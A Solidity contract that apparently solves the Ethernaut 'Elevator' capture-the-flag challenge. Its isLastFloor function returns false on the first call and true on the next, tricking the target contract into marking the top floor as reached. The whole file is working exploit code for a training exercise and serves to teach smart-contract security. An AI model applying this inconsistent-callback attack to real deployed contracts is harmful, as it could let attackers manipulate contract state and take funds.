// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttacker {
    address public challengeInstance;
    uint counter = 1;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (counter < 2) {
            counter++;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        IElevator(challengeInstance).goTo(99);
    }
}